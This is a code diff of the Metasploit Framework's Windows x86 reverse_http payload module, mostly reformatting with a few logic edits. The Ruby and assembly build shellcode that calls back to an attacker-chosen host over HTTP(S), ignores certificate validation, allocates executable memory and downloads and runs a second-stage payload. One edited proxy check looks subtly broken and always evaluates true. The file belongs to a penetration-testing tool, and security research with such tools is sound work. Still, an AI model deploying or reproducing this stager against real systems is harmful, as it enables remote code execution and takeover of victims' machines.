@@ -1,240 +1,235 @@
 # -*- coding: binary -*-
 
 module Msf
-
-###
-#
-# Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
-#
-###
-
-module Payload::Windows::ReverseHttp
-
-  include Msf::Payload::TransportConfig
-  include Msf::Payload::Windows
-  include Msf::Payload::Windows::BlockApi
-  include Msf::Payload::Windows::Exitfunk
-  include Msf::Payload::UUID::Options
-
+  ###
   #
-  # Register reverse_http specific options
+  # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
   #
-  def initialize(*args)
-    super
-    register_advanced_options(
-      [ OptInt.new('StagerURILength', 'The URI length for the stager (at least 5 bytes)') ] +
-      Msf::Opt::stager_retry_options +
-      Msf::Opt::http_header_options +
-      Msf::Opt::http_proxy_options
-    )
-  end
+  ###
 
-  #
-  # Generate the first stage
-  #
-  def generate(opts={})
-    ds = opts[:datastore] || datastore
-    conf = {
-      ssl:         opts[:ssl] || false,
-      host:        ds['LHOST'] || '127.127.127.127',
-      port:        ds['LPORT'],
-      retry_count: ds['StagerRetryCount'],
-      retry_wait:  ds['StagerRetryWait']
-    }
+  module Payload::Windows::ReverseHttp
+    include Msf::Payload::TransportConfig
+    include Msf::Payload::Windows
+    include Msf::Payload::Windows::BlockApi
+    include Msf::Payload::Windows::Exitfunk
+    include Msf::Payload::UUID::Options
 
-    # Add extra options if we have enough space
-    if self.available_space.nil? || required_space <= self.available_space
-      conf[:url]            = luri + generate_uri(opts)
-      conf[:exitfunk]       = ds['EXITFUNC']
-      conf[:ua]             = ds['HttpUserAgent']
-      conf[:proxy_host]     = ds['HttpProxyHost']
-      conf[:proxy_port]     = ds['HttpProxyPort']
-      conf[:proxy_user]     = ds['HttpProxyUser']
-      conf[:proxy_pass]     = ds['HttpProxyPass']
-      conf[:proxy_type]     = ds['HttpProxyType']
-      conf[:custom_headers] = get_custom_headers(ds)
-    else
-      # Otherwise default to small URIs
-      conf[:url]        = luri + generate_small_uri
+    #
+    # Register reverse_http specific options
+    #
+    def initialize(*args)
+      super
+      register_advanced_options(
+        [ OptInt.new('StagerURILength', 'The URI length for the stager (at least 5 bytes)') ] +
+        Msf::Opt.stager_retry_options +
+        Msf::Opt.http_header_options +
+        Msf::Opt.http_proxy_options
+      )
     end
 
-    generate_reverse_http(conf)
-  end
+    #
+    # Generate the first stage
+    #
+    def generate(opts = {})
+      ds = opts[:datastore] || datastore
+      conf = {
+        ssl: opts[:ssl] || false,
+        host: ds['LHOST'] || '127.127.127.127',
+        port: ds['LPORT'],
+        retry_count: ds['StagerRetryCount'],
+        retry_wait: ds['StagerRetryWait']
+      }
 
-  #
-  # Generate the custom headers string
-  #
-  def get_custom_headers(ds)
-    headers = ""
-    headers << "Host: #{ds['HttpHostHeader']}\r\n" if ds['HttpHostHeader']
-    headers << "Cookie: #{ds['HttpCookie']}\r\n" if ds['HttpCookie']
-    headers << "Referer: #{ds['HttpReferer']}\r\n" if ds['HttpReferer']
+      # Add extra options if we have enough space
+      if available_space.nil? || required_space <= available_space
+        conf[:url] = luri + generate_uri(opts)
+        conf[:exitfunk] = ds['EXITFUNC']
+        conf[:ua] = ds['HttpUserAgent']
+        conf[:proxy_host] = ds['HttpProxyHost']
+        conf[:proxy_port] = ds['HttpProxyPort']
+        conf[:proxy_user] = ds['HttpProxyUser']
+        conf[:proxy_pass] = ds['HttpProxyPass']
+        conf[:proxy_type] = ds['HttpProxyType']
+        conf[:custom_headers] = get_custom_headers(ds)
+      else
+        # Otherwise default to small URIs
+        conf[:url] = luri + generate_small_uri
+      end
 
-    if headers.length > 0
-      headers
-    else
-      nil
+      generate_reverse_http(conf)
     end
-  end
 
-  #
-  # Generate and compile the stager
-  #
-  def generate_reverse_http(opts={})
-    combined_asm = %Q^
+    #
+    # Generate the custom headers string
+    #
+    def get_custom_headers(ds)
+      headers = ''
+      headers << "Host: #{ds['HttpHostHeader']}\r\n" if ds['HttpHostHeader']
+      headers << "Cookie: #{ds['HttpCookie']}\r\n" if ds['HttpCookie']
+      headers << "Referer: #{ds['HttpReferer']}\r\n" if ds['HttpReferer']
+
+      if !headers.empty?
+        headers
+      end
+    end
+
+    #
+    # Generate and compile the stager
+    #
+    def generate_reverse_http(opts = {})
+      combined_asm = %(
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
         pop ebp
       #{asm_reverse_http(opts)}
-    ^
-    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
-  end
-
-  #
-  # Generate the transport-specific configuration
-  #
-  def transport_config(opts={})
-    transport_config_reverse_http(opts)
-  end
-
-  #
-  # Generate the URI for the initial stager
-  #
-  def generate_uri(opts={})
-    ds = opts[:datastore] || datastore
-    uri_req_len = ds['StagerURILength'].to_i
-
-    # Choose a random URI length between 30 and 255 bytes
-    if uri_req_len == 0
-      uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
+    )
+      Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
     end
 
-    if uri_req_len < 5
-      raise ArgumentError, "Minimum StagerURILength is 5"
+    #
+    # Generate the transport-specific configuration
+    #
+    def transport_config(opts = {})
+      transport_config_reverse_http(opts)
     end
 
-    generate_uri_uuid_mode(:init_native, uri_req_len)
-  end
+    #
+    # Generate the URI for the initial stager
+    #
+    def generate_uri(opts = {})
+      ds = opts[:datastore] || datastore
+      uri_req_len = ds['StagerURILength'].to_i
 
-  #
-  # Generate the URI for the initial stager
-  #
-  def generate_small_uri
-    generate_uri_uuid_mode(:init_native, 30)
-  end
+      # Choose a random URI length between 30 and 255 bytes
+      if uri_req_len == 0
+        uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
+      end
 
-  #
-  # Determine the maximum amount of space required for the features requested
-  #
-  def required_space
-    # Start with our cached default generated size
-    space = cached_size
+      if uri_req_len < 5
+        raise ArgumentError, 'Minimum StagerURILength is 5'
+      end
 
-    # Add 100 bytes for the encoder to have some room
-    space += 100
+      generate_uri_uuid_mode(:init_native, uri_req_len)
+    end
 
-    # Make room for the maximum possible URL length
-    space += 256
+    #
+    # Generate the URI for the initial stager
+    #
+    def generate_small_uri
+      generate_uri_uuid_mode(:init_native, 30)
+    end
 
-    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
-    space += 31
+    #
+    # Determine the maximum amount of space required for the features requested
+    #
+    def required_space
+      # Start with our cached default generated size
+      space = cached_size
 
-    # Proxy options?
-    space += 200
+      # Add 100 bytes for the encoder to have some room
+      space += 100
 
-    # Custom headers? Ugh, impossible to tell
-    space += 512
+      # Make room for the maximum possible URL length
+      space += 256
 
-    # The final estimated size
-    space
-  end
+      # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
+      space += 31
 
-  #
-  # Convert a string into a NULL-terminated ASCII byte array
-  #
-  def asm_generate_ascii_array(str)
-    (str.to_s + "\x00").
-      unpack("C*").
-      map{ |c| "0x%.2x" % c }.
-      join(",")
-  end
+      # Proxy options?
+      space += 200
 
-  #
-  # Generate an assembly stub with the configured feature set and options.
-  #
-  # @option opts [Bool] :ssl Whether or not to enable SSL
-  # @option opts [String] :url The URI to request during staging
-  # @option opts [String] :host The host to connect to
-  # @option opts [Integer] :port The port to connect to
-  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
-  # @option opts [String] :proxy_host The optional proxy server host to use
-  # @option opts [Integer] :proxy_port The optional proxy server port to use
-  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
-  # @option opts [String] :proxy_user The optional proxy server username
-  # @option opts [String] :proxy_pass The optional proxy server password
-  # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
-  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
-  # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
-  #
-  def asm_reverse_http(opts={})
+      # Custom headers? Ugh, impossible to tell
+      space += 512
 
-    retry_count   = opts[:retry_count].to_i
-    retry_wait   = opts[:retry_wait].to_i * 1000
-    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
-    proxy_info    = ""
+      # The final estimated size
+      space
+    end
 
-    if proxy_enabled
-      if opts[:proxy_type].to_s.downcase == "socks"
-        proxy_info << "socks="
+    #
+    # Convert a string into a NULL-terminated ASCII byte array
+    #
+    def asm_generate_ascii_array(str)
+      (str.to_s + "\x00")
+        .unpack('C*')
+        .map { |c| '0x%.2x' % c }
+        .join(',')
+    end
+
+    #
+    # Generate an assembly stub with the configured feature set and options.
+    #
+    # @option opts [Bool] :ssl Whether or not to enable SSL
+    # @option opts [String] :url The URI to request during staging
+    # @option opts [String] :host The host to connect to
+    # @option opts [Integer] :port The port to connect to
+    # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+    # @option opts [String] :proxy_host The optional proxy server host to use
+    # @option opts [Integer] :proxy_port The optional proxy server port to use
+    # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
+    # @option opts [String] :proxy_user The optional proxy server username
+    # @option opts [String] :proxy_pass The optional proxy server password
+    # @option opts [String] :custom_headers The optional collection of custom headers for the payload.
+    # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
+    # @option opts [Integer] :retry_wait The seconds to wait before retry a new request
+    #
+    def asm_reverse_http(opts = {})
+      retry_count = opts[:retry_count].to_i
+      retry_wait = opts[:retry_wait].to_i * 1000
+      proxy_enabled = !(!opts[:proxy_host].to_s.strip.empty?).nil?
+      proxy_info = ''
+
+      if proxy_enabled
+        if opts[:proxy_type].to_s.downcase == 'socks'
+          proxy_info << 'socks='
+        else
+          proxy_info << 'http://'
+        end
+
+        proxy_info << opts[:proxy_host].to_s
+        if opts[:proxy_port].to_i > 0
+          proxy_info << ":#{opts[:proxy_port]}"
+        end
+      end
+
+      proxy_user = opts[:proxy_user].to_s.empty? ? nil : opts[:proxy_user]
+      proxy_pass = opts[:proxy_pass].to_s.empty? ? nil : opts[:proxy_pass]
+
+      custom_headers = opts[:custom_headers].to_s.empty? ? nil : asm_generate_ascii_array(opts[:custom_headers])
+
+      http_open_flags = 0
+      secure_flags = 0
+
+      if opts[:ssl]
+        http_open_flags = (
+          0x80000000 | # INTERNET_FLAG_RELOAD
+          0x04000000 | # INTERNET_NO_CACHE_WRITE
+          0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+          0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+          0x00080000 | # INTERNET_FLAG_NO_COOKIES
+          0x00000200 | # INTERNET_FLAG_NO_UI
+          0x00800000 | # INTERNET_FLAG_SECURE
+          0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+          0x00001000) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+
+        secure_flags = (
+          0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+          0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+          0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+          0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+          0x00000080) # SECURITY_FLAG_IGNORE_REVOCATION
       else
-        proxy_info << "http://"
+        http_open_flags = (
+          0x80000000 | # INTERNET_FLAG_RELOAD
+          0x04000000 | # INTERNET_NO_CACHE_WRITE
+          0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+          0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+          0x00080000 | # INTERNET_FLAG_NO_COOKIES
+          0x00000200) # INTERNET_FLAG_NO_UI
       end
 
-      proxy_info << opts[:proxy_host].to_s
-      if opts[:proxy_port].to_i > 0
-        proxy_info << ":#{opts[:proxy_port]}"
-      end
-    end
-
-    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
-    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]
-
-    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_ascii_array(opts[:custom_headers])
-
-    http_open_flags = 0
-    secure_flags = 0
-
-    if opts[:ssl]
-      http_open_flags = (
-        0x80000000 | # INTERNET_FLAG_RELOAD
-        0x04000000 | # INTERNET_NO_CACHE_WRITE
-        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
-        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
-        0x00080000 | # INTERNET_FLAG_NO_COOKIES
-        0x00000200 | # INTERNET_FLAG_NO_UI
-        0x00800000 | # INTERNET_FLAG_SECURE
-        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
-        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
-
-      secure_flags = (
-        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
-        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
-        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
-        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
-        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
-    else
-      http_open_flags = (
-        0x80000000 | # INTERNET_FLAG_RELOAD
-        0x04000000 | # INTERNET_NO_CACHE_WRITE
-        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
-        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
-        0x00080000 | # INTERNET_FLAG_NO_COOKIES
-        0x00000200 ) # INTERNET_FLAG_NO_UI
-    end
-
-    asm = %Q^
+      asm = %^
       ;-----------------------------------------------------------------------------;
       ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
@@ -251,12 +246,12 @@ module Payload::Windows::ReverseHttp
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
     ^
 
-    asm << %Q^
+      asm << %(
     internetopen:
       push ebx               ; DWORD dwFlags
-    ^
-    if proxy_enabled
-      asm << %Q^
+    )
+      if proxy_enabled
+        asm << %^
         push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
       call get_proxy_server
         db "#{proxy_info}", 0x00
@@ -264,32 +259,32 @@ module Payload::Windows::ReverseHttp
                                ; LPCTSTR lpszProxyName (via call)
         push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
       ^
-    else
-      asm << %Q^
+      else
+        asm << %^
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
         push ebx               ; LPCTSTR lpszProxyName (NULL)
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
       ^
-    end
-    if opts[:ua].nil?
-      asm << %Q^
+      end
+      if opts[:ua].nil?
+        asm << %^
         push ebx               ; LPCTSTR lpszAgent (NULL)
       ^
-    else
-      asm << %Q^
+      else
+        asm << %^
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
       call get_useragent
         db "#{opts[:ua]}", 0x00
                                ; LPCTSTR lpszAgent (via call)
       get_useragent:
       ^
-    end
-    asm << %Q^
+      end
+      asm << %(
       push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
       call ebp
-    ^
+    )
 
-    asm << %Q^
+      asm << %^
       internetconnect:
         push ebx               ; DWORD_PTR dwContext (NULL)
         push ebx               ; dwFlags
@@ -307,11 +302,11 @@ module Payload::Windows::ReverseHttp
         mov esi, eax           ; Store hConnection in esi
     ^
 
-    # Note: wine-1.6.2 does not support SSL w/proxy authentication properly, it
-    # doesn't set the Proxy-Authorization header on the CONNECT request.
+      # NOTE: wine-1.6.2 does not support SSL w/proxy authentication properly, it
+      # doesn't set the Proxy-Authorization header on the CONNECT request.
 
-    if proxy_enabled && proxy_user
-      asm << %Q^
+      if proxy_enabled && proxy_user
+        asm << %^
         ; DWORD dwBufferLength (length of username)
         push #{proxy_user.length}
         call set_proxy_username
@@ -324,10 +319,10 @@ module Payload::Windows::ReverseHttp
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
-    end
+      end
 
-    if proxy_enabled && proxy_pass
-      asm << %Q^
+      if proxy_enabled && proxy_pass
+        asm << %^
         ; DWORD dwBufferLength (length of password)
         push #{proxy_pass.length}
         call set_proxy_password
@@ -340,12 +335,12 @@ module Payload::Windows::ReverseHttp
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
-    end
+      end
 
-    asm << %Q^
+      asm << %^
       httpopenrequest:
         push ebx               ; dwContext (NULL)
-        push #{"0x%.8x" % http_open_flags}   ; dwFlags
+        push #{'0x%.8x' % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
@@ -356,21 +351,21 @@ module Payload::Windows::ReverseHttp
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
      ^
-    if retry_count > 0
-      asm << %Q^
+      if retry_count > 0
+        asm << %(
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
         pop edi
-      ^
-    end
+      )
+      end
 
-    asm << %Q^
+      asm << %(
       send_request:
-    ^
+    )
 
-    if opts[:ssl]
-      asm << %Q^
+      if opts[:ssl]
+        asm << %^
       ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
       set_security_options:
         push 0x#{secure_flags.to_s(16)}
@@ -382,29 +377,29 @@ module Payload::Windows::ReverseHttp
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
       ^
-    end
+      end
 
-    asm << %Q^
+      asm << %^
       httpsendrequest:
         push ebx               ; lpOptional length (0)
         push ebx               ; lpOptional (NULL)
     ^
 
-    if custom_headers
-      asm << %Q^
+      if custom_headers
+        asm << %^
         push -1                ; dwHeadersLength (assume NULL terminated)
         call get_req_headers   ; lpszHeaders (pointer to the custom headers)
         db #{custom_headers}
       get_req_headers:
       ^
-    else
-      asm << %Q^
+      else
+        asm << %^
         push ebx               ; HeadersLength (0)
         push ebx               ; Headers (NULL)
       ^
-    end
+      end
 
-    asm << %Q^
+      asm << %^
         push esi               ; hHttpRequest
         push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call ebp
@@ -417,39 +412,38 @@ module Payload::Windows::ReverseHttp
         call ebp               ; Sleep( dwMilliseconds );
       ^
 
-    if retry_count > 0
-      asm << %Q^
+      if retry_count > 0
+        asm << %(
         try_it_again:
           dec edi
           jnz send_request
 
         ; if we didn't allocate before running out of retries, bail out
-        ^
-    else
-      asm << %Q^
+        )
+      else
+        asm << %(
         try_it_again:
           jmp send_request
 
         ; retry forever
-        ^
-    end
+        )
+      end
 
-    if opts[:exitfunk]
-      asm << %Q^
+      if opts[:exitfunk]
+        asm << %(
     failure:
       call exitfunk
-      ^
-    else
-      asm << %Q^
+      )
+      else
+        asm << %(
     failure:
       push 0x56A2B5F0        ; hardcoded to exitprocess for size
       call ebp
-      ^
-    end
+      )
+      end
 
-
-    if defined?(dynamic_stage_size?) && dynamic_stage_size?
-    asm << %Q^
+      if defined?(read_stage_size?) && read_stage_size?
+        asm << %^
     allocate_memory:
     read_stage_size:
       push ebx               ; temporary storage for stage size
@@ -494,14 +488,13 @@ module Payload::Windows::ReverseHttp
       pop eax                ; clear the temporary storage for bytesread
 
     ^
-    else
-    asm << %Q^
+      else
+        asm << %^
     allocate_memory:
-      xor eax, eax
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
       push 0x00400000        ; Stage allocation (4Mb ought to do us)
-      push eax               ; NULL as we dont care where the allocation is
+      push ebx               ; NULL as we dont care where the allocation is
       push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
@@ -529,9 +522,9 @@ module Payload::Windows::ReverseHttp
       jnz download_more      ; continue until it returns 0
       pop eax                ; clear the temporary storage for bytesread
     ^
-    end
+      end
 
-    asm << %Q^
+      asm << %(
     execute_stage:
       ret                    ; dive into the stored stage address
 
@@ -541,30 +534,27 @@ module Payload::Windows::ReverseHttp
 
     server_host:
       db "#{opts[:host]}", 0x00
-    ^
+    )
 
-    if opts[:exitfunk]
-      asm << asm_exitfunk(opts)
+      if opts[:exitfunk]
+        asm << asm_exitfunk(opts)
+      end
+
+      asm
     end
 
-    asm
-  end
+    #
+    # Do not transmit the stage over the connection.  We handle this via HTTPS
+    #
+    def stage_over_connection?
+      false
+    end
 
-  #
-  # Do not transmit the stage over the connection.  We handle this via HTTPS
-  #
-  def stage_over_connection?
-    false
+    #
+    # Always wait at least 20 seconds for this payload (due to staging delays)
+    #
+    def wfs_delay
+      20
+    end
   end
-
-  #
-  # Always wait at least 20 seconds for this payload (due to staging delays)
-  #
-  def wfs_delay
-    20
-  end
-
 end
-
-end
-
